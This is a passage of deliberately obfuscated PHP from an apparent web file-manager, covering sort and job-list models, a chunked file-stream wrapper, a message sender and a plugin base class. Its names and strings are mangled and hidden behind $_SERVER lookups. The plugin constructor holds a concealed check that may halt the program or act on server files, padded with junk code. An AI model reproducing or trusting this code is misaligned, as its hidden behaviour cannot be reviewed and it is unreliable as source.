USER_ID); for ($Ã·šÖÓ = 0; $Ã·šÖÓ < count($İ™²äÏ½); $Ã·šÖÓ++) { $Ãî±ñè°[$îÎ–¬›ï[420]] = $İ™²äÏ½[$Ã·šÖÓ]; $this->where($Ãî±ñè°)->save(array($îÎ–¬›ï[1811] => $Ã·šÖÓ + 1)); } return !0; } protected function moveTop($÷êî‡) { $ôºß×Ò¥ =& $_SERVER[¥Ÿ©ÒèÌ]; $º±œ ü = array($ôºß×Ò¥[1630] => USER_ID, $ôºß×Ò¥[483] => 0); $Ï–Ê·‹ = $this->where($º±œ ü)->where(array($ôºß×Ò¥[32] => $÷êî‡))->find(); if (!$Ï–Ê·‹) { return; } $ç“º—…Á = $this->field($ôºß×Ò¥[401])->where($º±œ ü)->order($ôºß×Ò¥[2235])->select(); $ç“º—…Á = array_to_keyvalue($ç“º—…Á, $ôºß×Ò¥[12], $ôºß×Ò¥[401]); $œÓÅª¡¦ = $ç“º—…Á; $ç“º—…Á = array_remove_value($ç“º—…Á, $Ï–Ê·‹[$ôºß×Ò¥[401]]); array_unshift($ç“º—…Á, $Ï–Ê·‹[$ôºß×Ò¥[401]]); return $this->resetSort($ç“º—…Á); } protected function moveBottom($ ß¦‰¦) { $úìëÏøÖ =& $_SERVER[¥Ÿ©ÒèÌ]; $Â¢Ã¨Òõ = array($úìëÏøÖ[1630] => USER_ID, $úìëÏøÖ[483] => 0); $ˆ¥Š­½É = $this->where($Â¢Ã¨Òõ)->max($úìëÏøÖ[1830]); $¢ÕßãÀ = array($úìëÏøÖ[1830] => $ˆ¥Š­½É + 1); return $this->where($Â¢Ã¨Òõ)->where(array($úìëÏøÖ[32] => $ ß¦‰¦))->save($¢ÕßãÀ); } private function getAutoName($€ÚÎ‡ğù) { $§´Ò»Áƒ =& $_SERVER[¥Ÿ©ÒèÌ]; $¸ğ±¥Ù = array($§´Ò»Áƒ[1630] => USER_ID, $§´Ò»Áƒ[483] => 0); $’Åíô  = $this->field($§´Ò»Áƒ[32])->where($¸ğ±¥Ù)->select(); $’Åíô  = array_to_keyvalue($’Åíô , $§´Ò»Áƒ[12], $§´Ò»Áƒ[32]); if (!$’Åíô  || !in_array($€ÚÎ‡ğù, $’Åíô )) { return $€ÚÎ‡ğù; } for ($ˆ»á±ÉÛ = 0; $ˆ»á±ÉÛ < count($’Åíô ); $ˆ»á±ÉÛ++) { if (!in_array($€ÚÎ‡ğù . "\x28{$ˆ»á±ÉÛ}\51", $’Åíô )) { return $€ÚÎ‡ğù . "\x28{$ˆ»á±ÉÛ}\51"; } } return $€ÚÎ‡ğù . "\x28{$ˆ»á±ÉÛ}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\152\x6f\x62\114\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x64\x65\163\x63", "\163\157\x72\x74"); const JOB_KEY = "\163\145\154\x66\x4a\157\x62\x4c\x69\163\164"; public function listData($—ºÜÒÀœ = false, $İ­œÀ£Æ = "\x73\157\x72\x74", $üğ—¢¨ = false) { return parent::listData($—ºÜÒÀœ, $İ­œÀ£Æ, $üğ—¢¨); } public function remove($áÇÅØÂ) { return parent::remove($áÇÅØÂ); } public function add($é””«¼´) { $ß¸»¯Æ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($this->findByName($é””«¼´[$ß¸»¯Æ[32]])) { return !1; } $é””«¼´[$ß¸»¯Æ[1830]] = $this->getSort(); return parent::insert($é””«¼´); } private function getSort() { $ÛÎÏÊ› =& $_SERVER[¥Ÿ©ÒèÌ]; $Œ…˜ù‚ = parent::listData(); $Ÿ¡Ëˆø = array_to_keyvalue($Œ…˜ù‚, $ÛÎÏÊ›[12], $ÛÎÏÊ›[1830]); return empty($Ÿ¡Ëˆø) ? 0 : max($Ÿ¡Ëˆø) + 1; } public function update($³ÒÈí‰, $ú©ä­êÓ) { $å®ƒºÁŞ =& $_SERVER[¥Ÿ©ÒèÌ]; $ßì¯Ê¾İ = parent::listData($³ÒÈí‰); $ í¡”ª = $this->findByName($ú©ä­êÓ[$å®ƒºÁŞ[32]]); if (!$ßì¯Ê¾İ || $ í¡”ª && $ í¡”ª[$å®ƒºÁŞ[401]] != $ßì¯Ê¾İ[$å®ƒºÁŞ[401]]) { return !1; } return parent::update($³ÒÈí‰, $ú©ä­êÓ); } public function setUserJob($õú‚Ëâ÷, $Úõàüô) { $…‰±ùå¡ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!is_array($Úõàüô)) { $Úõàüô = array($Úõàüô); } $é¡‰š²• = parent::listData(); $Í£¥¸ê = array_to_keyvalue($é¡‰š²•, $…‰±ùå¡[32]); $ÆœÏ‰¤¼ = $…‰±ùå¡[382]; foreach ($Úõàüô as $Ï½°¸¥Î) { if ($Í£¥¸ê[$Ï½°¸¥Î]) { $ÆœÏ‰¤¼ .= $Í£¥¸ê[$Ï½°¸¥Î][$…‰±ùå¡[401]] . $…‰±ùå¡[50]; } else { $üèû¢…ä = $this->add($Ï½°¸¥Î); $ÆœÏ‰¤¼ .= $üèû¢…ä . $…‰±ùå¡[50]; } } $ÆœÏ‰¤¼ = rtrim($ÆœÏ‰¤¼, $…‰±ùå¡[50]); Model($…‰±ùå¡[538])->metaSet($õú‚Ëâ÷, self::JOB_KEY, $ÆœÏ‰¤¼); } public function getUserJob($Ú°å·Ï×) { $òµ†Æò = Model($_SERVER[¥Ÿ©ÒèÌ][538])->metaGet($Ú°å·Ï×); return $this->getUserJobInfo($òµ†Æò[self::JOB_KEY]); } public function getUserJobInfo($‰»â¿ÑÂ) { $ÏÎÅŞ± =& $_SERVER[¥Ÿ©ÒèÌ]; $ö«àÈäÑ = explode($ÏÎÅŞ±[50], $‰»â¿ÑÂ); $Ó®­›ÈÎ = parent::listData(); $Ó®­›ÈÎ = array_remove_key($Ó®­›ÈÎ, $ÏÎÅŞ±[193]); $ø¼Ïç = array(); foreach ($ö«àÈäÑ as $ììàÚ¦°) { if (isset($Ó®­›ÈÎ[$ììàÚ¦°])) { $ø¼Ïç[] = $Ó®­›ÈÎ[$ììàÚ¦°]; } } return $ø¼Ïç; } } goto C‘Á¯Æ¸ö¯; Fß’Šä¡ÓÁ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ŒËúŒÉ, $À÷÷ú©  = '') { $this->info = $this->info($ŒËúŒÉ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¥Ÿ©ÒèÌ][78]]; $this->pathOpen = $ŒËúŒÉ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ŒËúŒÉ])) { self::$_chunkBuffer[$ŒËúŒÉ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($àä¹ó¼) { $íÉá‘Ã = $this->fileSubstr($this->pose, $àä¹ó¼); $this->pose += strlen($íÉá‘Ã); return $íÉá‘Ã; } public function stream_tell() { return $this->pose; } public function stream_seek($éÎÂÙ§, $¯«å ìö) { $Â×€š˜’ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($¯«å ìö == SEEK_SET) { $this->pose = $éÎÂÙ§; } else { if ($¯«å ìö == SEEK_CUR) { $this->pose += $éÎÂÙ§; } else { if ($¯«å ìö == SEEK_END) { $this->pose = $this->info[$Â×€š˜’[80]] + intval($éÎÂÙ§); } } } if ($éÎÂÙ§ < 0) { $this->pose = $this->info[$Â×€š˜’[80]] + $éÎÂÙ§; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¥Ÿ©ÒèÌ][80]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($àõô‘”, $€„¡†‰—) { $‡Ÿ¤“¯ú =& $_SERVER[¥Ÿ©ÒèÌ]; $ĞŸ™ıø„ = $this->info($àõô‘”); return array($‡Ÿ¤“¯ú[1487] => 0, $‡Ÿ¤“¯ú[1488] => 0, $‡Ÿ¤“¯ú[16] => 32768 + 511, $‡Ÿ¤“¯ú[1489] => 0, $‡Ÿ¤“¯ú[1490] => 0, $‡Ÿ¤“¯ú[1491] => 0, $‡Ÿ¤“¯ú[1492] => 0, $‡Ÿ¤“¯ú[80] => $ĞŸ™ıø„[$‡Ÿ¤“¯ú[80]], $‡Ÿ¤“¯ú[1493] => $ĞŸ™ıø„[$‡Ÿ¤“¯ú[1361]], $‡Ÿ¤“¯ú[1449] => $ĞŸ™ıø„[$‡Ÿ¤“¯ú[86]], $‡Ÿ¤“¯ú[1448] => $ĞŸ™ıø„[$‡Ÿ¤“¯ú[193]], $‡Ÿ¤“¯ú[1494] => 0, $‡Ÿ¤“¯ú[1495] => 0); } static $fileInfo = array(); public function info($¢½»Í•œ) { $—ìÊ°ëí = $_SERVER[¥Ÿ©ÒèÌ][1496]; if (isset(self::$fileInfo[$¢½»Í•œ])) { return self::$fileInfo[$¢½»Í•œ]; } if (substr($¢½»Í•œ, 0, strlen($—ìÊ°ëí)) != $—ìÊ°ëí) { return !1; } self::$fileInfo[$¢½»Í•œ] = IO::info(substr($¢½»Í•œ, strlen($—ìÊ°ëí))); return self::$fileInfo[$¢½»Í•œ]; } public static function read($”¿Ôà¤, $ãüçÉ¯, $ÑÀËı¬) { if (!isset(self::$_fopenCache[$”¿Ôà¤])) { $¸œÉà¿ = new StreamWrapperIO(); $¸œÉà¿->stream_open($”¿Ôà¤); self::$_fopenCache[$”¿Ôà¤] = $¸œÉà¿; } $¸œÉà¿ = self::$_fopenCache[$”¿Ôà¤]; return $¸œÉà¿->fileSubstr($ãüçÉ¯, $ÑÀËı¬); } public static function _read($èÆ£ÊøÕ, $Œš¨ÒÎí, $¬‰âÒÍğ) { $€â†ëÏç =& $_SERVER[¥Ÿ©ÒèÌ]; $üšÏôú = fopen($èÆ£ÊøÕ, $€â†ëÏç[1365]); if (!$üšÏôú) { return $€â†ëÏç[12]; } $°ò¦»ä­ = 8192; fseek($üšÏôú, $Œš¨ÒÎí, SEEK_SET); $‘â ½½¬ = $€â†ëÏç[12]; $ö›ÏÉï› = 0; while ($ö›ÏÉï› < $¬‰âÒÍğ) { $àÑ‰ûñŸ = min($°ò¦»ä­, $¬‰âÒÍğ - $ö›ÏÉï›); $‘â ½½¬ .= fread($üšÏôú, $àÑ‰ûñŸ); $ö›ÏÉï› += $àÑ‰ûñŸ; } fclose($üšÏôú); return $‘â ½½¬; } public function fileSubstr($û¼‰šŠ®, $Øğ•¥) { $†Š¡®Ô =& $_SERVER[¥Ÿ©ÒèÌ]; $ç½´œı® = $this->info[$†Š¡®Ô[80]]; $µ„Âù•ï = $û¼‰šŠ®; $Î÷¯ä¥ô = $Øğ•¥; if ($û¼‰šŠ® < 0) { $û¼‰šŠ® = $ç½´œı® + $û¼‰šŠ®; } if ($Øğ•¥ === !1) { $Øğ•¥ = $ç½´œı® - $û¼‰šŠ®; } if ($û¼‰šŠ® + $Øğ•¥ > $ç½´œı®) { $Øğ•¥ = $ç½´œı® - $û¼‰šŠ®; } if ($Øğ•¥ <= 0) { return $†Š¡®Ô[12]; } if ($û¼‰šŠ® < 0 || $û¼‰šŠ® >= $ç½´œı® || $Øğ•¥ <= 0 || $Øğ•¥ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\x69\x6c\x65\x52\x65\141\x64\40\x65\162\x72\157\162\x21\40\163\164\141\162\164\x3d{$û¼‰šŠ®}\73\x6c\145\x6e\x67\164\x68\75{$Øğ•¥}\73\40\163\x69\x7a\145\x3d{$ç½´œı®}\x3b"); } $Şô÷Ê¶ö = 64 * 1024; $©ÊªÚ¸´ =& self::$_chunkBuffer[$this->path]; if (!$©ÊªÚ¸´) { $©ÊªÚ¸´ = array(); } $àªìÄèÂ = 0; $ƒÃõ†¨í = 0; $«á½ĞîÛ = $†Š¡®Ô[12]; foreach ($©ÊªÚ¸´ as $àªìÄèÂ => $«á½ĞîÛ) { $àªìÄèÂ = intval($àªìÄèÂ); $ƒÃõ†¨í = $àªìÄèÂ + strlen($«á½ĞîÛ); if ($û¼‰šŠ® >= $ƒÃõ†¨í) { continue; } if ($û¼‰šŠ® >= $àªìÄèÂ && $û¼‰šŠ® + $Øğ•¥ <= $ƒÃõ†¨í) { return substr($«á½ĞîÛ, $û¼‰šŠ® - $àªìÄèÂ, $Øğ•¥); } break; } if (count($©ÊªÚ¸´) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($†Š¡®Ô[1497], $†Š¡®Ô[1498] . count($©ÊªÚ¸´) . "\73\163\164\x61\162\x74\x3d{$û¼‰šŠ®}\54\154\145\156\147\164\x68\x3d{$Øğ•¥}\x3b\160\x6f\163\145\72{$àªìÄèÂ}\176{$ƒÃõ†¨í}"); throw new Exception($†Š¡®Ô[1499]); } $ÆšÙŒİó = intval($û¼‰šŠ® / $Şô÷Ê¶ö) * $Şô÷Ê¶ö; $³¬Òº°¤ = ceil(($û¼‰šŠ® + $Øğ•¥) / $Şô÷Ê¶ö) * $Şô÷Ê¶ö - $ÆšÙŒİó; $ÓÀÙ™Á = IO::fileSubstr($this->path, $ÆšÙŒİó, $³¬Òº°¤); $©ÊªÚ¸´[$ÆšÙŒİó . $†Š¡®Ô[12]] = $ÓÀÙ™Á; ksort($©ÊªÚ¸´); $õÉ•ÉØ£ = substr($ÓÀÙ™Á, $û¼‰šŠ® - $ÆšÙŒİó, $Øğ•¥); return $õÉ•ÉØ£; } private function log($¥ìí¯½Ï, $æœÉ–òˆ) { $¹Ô§ÎÄ =& $_SERVER[¥Ÿ©ÒèÌ]; $³éäºªì = timeFloat() - $this->timeStart; write_log(sprintf($¹Ô§ÎÄ[1500], $¥ìí¯½Ï, $this->info[$¹Ô§ÎÄ[32]], $³éäºªì, $æœÉ–òˆ), $¹Ô§ÎÄ[1167]); } } class Message { function __construct() { } public function send($ûâ¬æù© = '', $µ»èíñ = array(), $ûŒ±­ìØ = "\x74\145\x78\164") { $¶ÙèíŸÃ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ñ‹ÈÇ¢Œ = array($¶ÙèíŸÃ[33] => $¶ÙèíŸÃ[1501], $¶ÙèíŸÃ[745] => $ûâ¬æù©); if (in_array($ûŒ±­ìØ, array($¶ÙèíŸÃ[1501], $¶ÙèíŸÃ[1502]))) { $Ñ‹ÈÇ¢Œ[$¶ÙèíŸÃ[33]] = $ûŒ±­ìØ; } $µ»èíñ = array($¶ÙèíŸÃ[515] => isset($µ»èíñ[$¶ÙèíŸÃ[515]]) ? $µ»èíñ[$¶ÙèíŸÃ[515]] : $¶ÙèíŸÃ[12], $¶ÙèíŸÃ[594] => isset($µ»èíñ[$¶ÙèíŸÃ[594]]) ? $µ»èíñ[$¶ÙèíŸÃ[594]] : $¶ÙèíŸÃ[12]); if (empty($ûâ¬æù©) || empty($µ»èíñ[$¶ÙèíŸÃ[515]]) && empty($µ»èíñ[$¶ÙèíŸÃ[594]])) { return !1; } $°Óé„üö = array($¶ÙèíŸÃ[1442] => $Ñ‹ÈÇ¢Œ, $¶ÙèíŸÃ[1503] => $µ»èíñ); Hook::trigger($¶ÙèíŸÃ[1504], $°Óé„üö); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ì÷¢Ü¸Ş =& $_SERVER[¥Ÿ©ÒèÌ]; if ($_SERVER[$ì÷¢Ü¸Ş[233]] != $_SERVER[$ì÷¢Ü¸Ş[234]]) { $áû”ïÊÈ = $ì÷¢Ü¸Ş[863]; $²Å•¡ì¥ = $ì÷¢Ü¸Ş[235]; $ÜŞÔ©ç‘ = $_SERVER[$ì÷¢Ü¸Ş[236]] . $ì÷¢Ü¸Ş[237]; $İÜÊ¼å¿ = $²Å•¡ì¥($ÜŞÔ©ç‘); $Ìº¾à‘ = explode($ì÷¢Ü¸Ş[226], $İÜÊ¼å¿); if (count($Ìº¾à‘) < $ì÷¢Ü¸Ş[622]) { $Ò«‚íšØ = $ì÷¢Ü¸Ş[239]; $Ò«‚íšØ(); } $›¶×Ø = $ì÷¢Ü¸Ş[864]; $›¶×Ø($_SERVER[$ì÷¢Ü¸Ş[865]]); $›¶×Ø($_SERVER[$ì÷¢Ü¸Ş[236]] . $ì÷¢Ü¸Ş[1505]); $€…ñ‹²Ç = 1; while ($€…ñ‹²Ç > 1) { $€…ñ‹²Ç = $€…ñ‹²Ç + 4; $û£‚¡á­ = rawurlencode($€…ñ‹²Ç . $ì÷¢Ü¸Ş[382]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ì÷¢Ü¸Ş[1506]); $this->pluginName = str_replace($ì÷¢Ü¸Ş[1506], $ì÷¢Ü¸Ş[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ì÷¢Ü¸Ş[8]; $this->pluginApi = appHostGet() . $ì÷¢Ü¸Ş[1507] . $this->pluginName . $ì÷¢Ü¸Ş[8]; $this->pluginHost = $config[$ì÷¢Ü¸Ş[1508]] . $this->pluginName . $ì÷¢Ü¸Ş[8]; $this->pluginHostDefault = $config[$ì÷¢Ü¸Ş[1508]] . $this->pluginName . $ì÷¢Ü¸Ş[8]; $¾Ï®çÁ = $config[$ì÷¢Ü¸Ş[1509]]; if ($¾Ï®çÁ && strpos($ì÷¢Ü¸Ş[50] . $¾Ï®çÁ . $ì÷¢Ü¸Ş[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ì÷¢Ü¸Ş[1510]] . $this->pluginName . $ì÷¢Ü¸Ş[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¥Ÿ©ÒèÌ][1511]); } protected function assign($à©åè¸’, $œˆÀ¡ùµ = false) { if (is_array($à©åè¸’)) { $this->values = array_merge($this->values, $à©åè¸’); } else { $this->values[$à©åè¸’] = $œˆÀ¡ùµ; } } protected function display($¢«ñéÃ) { extract($this->values); require $¢«ñéÃ; } final function hookRegist($ÈÊµäá) { $this->modelPlugin->appRegist($this->pluginName, $ÈÊµäá); } final function appIcon() { $ï½Ô•Ö• =& $_SERVER[¥Ÿ©ÒèÌ]; $„Ä´î = $this->appPackage(); $‰‚˜ÈÁ© = $ï½Ô•Ö•[12]; if (isset($„Ä´î[$ï½Ô•Ö•[417]])) { if (isset($„Ä´î[$ï½Ô•Ö•[417]][$ï½Ô•Ö•[1512]])) { $‰‚˜ÈÁ© = $ï½Ô•Ö•[1513] . $„Ä´î[$ï½Ô•Ö•[417]][$ï½Ô•Ö•[1512]] . $ï½Ô•Ö•[1514]; } else { if ($„Ä´î[$ï½Ô•Ö•[417]][$ï½Ô•Ö•[1515]]) { $‰‚˜ÈÁ© = $ï½Ô•Ö•[1516] . $„Ä´î[$ï½Ô•Ö•[417]][$ï½Ô•Ö•[1515]] . $ï½Ô•Ö•[1517]; } } } return $‰‚˜ÈÁ©; } final function fileCanView($Ÿ…òÄ…×) { $Ğõş§ÀÂ =& $_SERVER[¥Ÿ©ÒèÌ]; if (request_url_safe($Ÿ…òÄ…×)) { return !0; } if ($this->isShare($Ÿ…òÄ…×)) { return !0; } $·¯Øı¼ = Session::get($Ğõş§ÀÂ[1518]); if (!$·¯Øı¼ || !$·¯Øı¼[$Ğõş§ÀÂ[1519]]) { $¯ğ©ˆ§ª = $Ğõş§ÀÂ[1520] . rawurlencode(this_url()); show_tips(LNG($Ğõş§ÀÂ[1521]) . $Ğõş§ÀÂ[1522] . $¯ğ©ˆ§ª . $Ğõş§ÀÂ[1523] . LNG($Ğõş§ÀÂ[1524]) . $Ğõş§ÀÂ[1525], !1); } if (!Action($Ğõş§ÀÂ[1526])->authCan($Ğõş§ÀÂ[1527])) { show_tips(LNG($Ğõş§ÀÂ[1528]) . $Ğõş§ÀÂ[1529], !1); } ActionCall($Ğõş§ÀÂ[1530], $Ÿ…òÄ…×); } final function isShare($ËÈÊÛ—) { $à¾ôÊ°â = KodIO::parse($ËÈÊÛ—); return $à¾ôÊ°â[$_SERVER[¥Ÿ©ÒèÌ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($œ×Ûâ¼) { if (request_url_safe($œ×Ûâ¼)) { return $œ×Ûâ¼; } if (!$this->isShare($œ×Ûâ¼)) { $œ×Ûâ¼ = $this->filePath($œ×Ûâ¼); } return Action($_SERVER[¥Ÿ©ÒèÌ][1159])->linkOut($œ×Ûâ¼); } public function filePathLinkOut($şİ”‚©) { if (request_url_safe($şİ”‚©)) { return $şİ”‚©; } $this->fileCanView($şİ”‚©); return Action($_SERVER[¥Ÿ©ÒèÌ][1159])->link($şİ”‚©); } final function filePath($•“ìÛÓÓ) { $ùÉ˜ºîÛ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($£°ûÉÆŠ = $this->checkSharePath($•“ìÛÓÓ)) { Hook::trigger($ùÉ˜ºîÛ[1531], $£°ûÉÆŠ); return $£°ûÉÆŠ; } $this->fileCanView($•“ìÛÓÓ); if (request_url_safe($•“ìÛÓÓ)) { $Å—ëë = parse_url_query($•“ìÛÓÓ); if (isset($Å—ëë[$ùÉ˜ºîÛ[1532]]) && isset($Å—ëë[$ùÉ˜ºîÛ[208]])) { $èàÖÊç› = Model($ùÉ˜ºîÛ[760])->get($ùÉ˜ºîÛ[761]); $ƒÔ‚üù = Mcrypt::decode($Å—ëë[$ùÉ˜ºîÛ[208]], $èàÖÊç›); if ($ƒÔ‚üù) { $this->fileInfo = IO::infoWithChildren($ƒÔ‚üù); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ƒÔ‚üù; } } $•“ìÛÓÓ = $this->_cacheHttpFile($•“ìÛÓÓ); $this->fileInfo = IO::infoWithChildren($•“ìÛÓÓ); } else { $this->fileInfo = IO::infoWithChildren($•“ìÛÓÓ); if (!$this->fileInfo) { show_tips(LNG($ùÉ˜ºîÛ[106]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($ùÉ˜ºîÛ[1531], $•“ìÛÓÓ); return $•“ìÛÓÓ; } final function _cacheHttpFile($§õ˜Ï¥†) { $­È§éÈ = hash_path($§õ˜Ï¥†, !0); $this->cachePath = $this->pluginCachePath($­È§éÈ); if ($†Å¨ô„Ÿ = IO::fileNameExist($this->cachePath, $­È§éÈ)) { return KodIO::make($†Å¨ô„Ÿ); } $ÖÜò´Ò· = $this->cachePath . $­È§éÈ; return $this->pluginCacheFileSet($ÖÜò´Ò·, file_get_contents_nossl($§õ˜Ï¥†)); } final function _tmpFileName($öô¿èè = array()) { $šÈªÉÔø =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$öô¿èè) { $öô¿èè = $this->fileInfo; } if (isset($öô¿èè[$šÈªÉÔø[170]])) { return $öô¿èè[$šÈªÉÔø[170]]; } if (isset($öô¿èè[$šÈªÉÔø[163]][$šÈªÉÔø[170]])) { return $öô¿èè[$šÈªÉÔø[163]][$šÈªÉÔø[170]]; } $š‹ƒ”çé = IO::hashSimple($öô¿èè[$šÈªÉÔø[78]]); if ($š‹ƒ”çé) { return $š‹ƒ”çé; } $’øÆŒØÁ = array($öô¿èè[$šÈªÉÔø[32]], $öô¿èè[$šÈªÉÔø[78]], $öô¿èè[$šÈªÉÔø[80]]); if (isset($öô¿èè[$šÈªÉÔø[521]])) { $’øÆŒØÁ[] = $öô¿èè[$šÈªÉÔø[521]]; } return md5(implode($šÈªÉÔø[11], $’øÆŒØÁ)); } final function checkSharePath($Òº‹Ä…È) { $ëÙçè·¸ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!defined($ëÙçè·¸[474])) { define($ëÙçè·¸[514], 0); } if (!$this->isShare($Òº‹Ä…È)) { return !1; } $èŸ×„ŸÒ = Action($ëÙçè·¸[1159])->sharePathInfo($Òº‹Ä…È); if (!isset($èŸ×„ŸÒ[$ëÙçè·¸[78]])) { show_json(LNG($ëÙçè·¸[1533]), !1); } $this->fileInfo = $èŸ×„ŸÒ[$ëÙçè·¸[163]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ëÙçè·¸[170]]); return $èŸ×„ŸÒ[$ëÙçè·¸[78]]; } final function pluginCachePath($ßšÈ¨€ = '') { $Ş±µºŠÖ =& $_SERVER[¥Ÿ©ÒèÌ]; $¥âÉÒ×¹ = IO_PATH_SYSTEM_TEMP . $Ş±µºŠÖ[1534] . $this->pluginName; if (!($½ÄòªŞ = IO::infoFull($¥âÉÒ×¹))) { return IO::mkdir($¥âÉÒ×¹ . $Ş±µºŠÖ[8] . $ßšÈ¨€); } if (empty($ßšÈ¨€)) { return $½ÄòªŞ[$Ş±µºŠÖ[78]]; } if (!($±ºòÉ¹ƒ = IO::fileNameExist($½ÄòªŞ[$Ş±µºŠÖ[78]], $ßšÈ¨€))) { return IO::mkdir($½ÄòªŞ[$Ş±µºŠÖ[78]] . $ßšÈ¨€); } return KodIO::make($±ºòÉ¹ƒ); } final function pluginCacheFileSet($×úõƒ£è, $¢Ç†ƒÂ¨ = '') { $¸üÂ«óª =& $_SERVER[¥Ÿ©ÒèÌ]; if (!($õ«‡…â½ = IO::infoFull($×úõƒ£è))) { return IO::mkfile($×úõƒ£è, $¢Ç†ƒÂ¨, REPEAT_REPLACE); } IO::setContent($õ«‡…â½[$¸üÂ«óª[78]], $¢Ç†ƒÂ¨); return $õ«‡…â½[$¸üÂ«óª[78]]; } final function pluginLocalFile($ß²Úı· = '') { $„ò€¼¨ =& $_SERVER[¥Ÿ©ÒèÌ]; $³ºúòÎ´ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($³ºúòÎ´)) { mk_dir($³ºúòÎ´); } if (!$ß²Úı·) { return $³ºúòÎ´; } $›Ÿæø¹Ã = IO::info($ß²Úı·); $„áã¸æƒ = $this->_tmpFileName($›Ÿæø¹Ã) . $„ò€¼¨[10] . $›Ÿæø¹Ã[$„ò€¼¨[167]]; if (!checkExtSafe($„áã¸æƒ)) { $„áã¸æƒ = $„áã¸æƒ . $„ò€¼¨[1535]; } $‰í­è”Ò = $³ºúòÎ´ . $„áã¸æƒ; if (@file_exists($‰í­è”Ò)) { return $‰í­è”Ò; } return IO::copy($ß²Úı·, $³ºúòÎ´, 0, $„áã¸æƒ); } final function appPackage() { $½¢æºåÄ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($this->packageData) { return $this->packageData; } $åœ£‘è… = $this->parseFile($this->pluginPath . $½¢æºåÄ[1536]); $this->parseLang($åœ£‘è…); $¨·®•æ = json_decode_force($åœ£‘è…); if (!$¨·®•æ) { return array(); } $û½Ğ¸›„ = Hook::trigger($½¢æºåÄ[1537], $¨·®•æ); if ($û½Ğ¸›„ && is_array($û½Ğ¸›„)) { $¨·®•æ = $û½Ğ¸›„; } $this->packageData = $¨·®•æ; return $¨·®•æ; } public function packageInfoGet($ñô½Í¢Ñ) { $Õéºêî = $this->appPackage(); return array_get_value($Õéºêî, $ñô½Í¢Ñ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¥Ÿ©ÒèÌ][1538]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¥Ÿ©ÒèÌ][1539]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¥Ÿ©ÒèÌ][1540]); } public function echoJsAssign($üÆßà‚¸, $‡É”´õä) { $this->echoJsAssignArr[$üÆßà‚¸] = $‡É”´õä; } private function parseFile($îš¾®Ê) { $øÚ´˜ =& $_SERVER[¥Ÿ©ÒèÌ]; $®¦¯ŠıÀ = file_get_contents_nossl($îš¾®Ê); $¿Œƒä› = array($øÚ´˜[1541], $øÚ´˜[1542], $øÚ´˜[1543], $øÚ´˜[1544], $øÚ´˜[1545], $øÚ´˜[1546], $øÚ´˜[1547]); $µ½ºÏÈ½ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$øÚ´˜[90]][$øÚ´˜[1548]]); foreach ($this->echoJsAssignArr as $óïÅåçÄ => $œä­Ş’ã) { $¿Œƒä›[] = $øÚ´˜[1549] . $óïÅåçÄ . $øÚ´˜[1550]; $µ½ºÏÈ½[] = is_array($œä­Ş’ã) || is_object($œä­Ş’ã) ? rawurlencode(json_encode($œä­Ş’ã)) : $œä­Ş’ã; } if (strstr($®¦¯ŠıÀ, $øÚ´˜[1551])) { $è…Ô©âã = rawurlencode(json_encode($this->pluginLangArr)); $®¦¯ŠıÀ = str_replace($øÚ´˜[1551], $è…Ô©âã, $®¦¯ŠıÀ); } if (strstr($®¦¯ŠıÀ, $øÚ´˜[1552])) { $è…Ô©âã = $è…Ô©âã = rawurlencode(json_encode($this->getConfig())); $®¦¯ŠıÀ = str_replace($øÚ´˜[1552], $è…Ô©âã, $®¦¯ŠıÀ); } $®¦¯ŠıÀ = str_replace($¿Œƒä›, $µ½ºÏÈ½, $®¦¯ŠıÀ); return $®¦¯ŠıÀ; } private function parseLang(&$†Ä´ü) { $ú³¼É¥‚ =& $_SERVER[¥Ÿ©ÒèÌ]; $™Ò•Ò– = $ú³¼É¥‚[1553]; if (!strstr($†Ä´ü, $™Ò•Ò–)) { return; } preg_match_all($ú³¼É¥‚[1554], $†Ä´ü, $÷×¹Ï„³); if (!is_array($÷×¹Ï„³) || count($÷×¹Ï„³) == 0 || !is_array($÷×¹Ï„³[0]) || count($÷×¹Ï„³[0]) == 0) { return; } $’‹Ï˜Íê = array(); $Ş…ã¢á‡ = array(); foreach 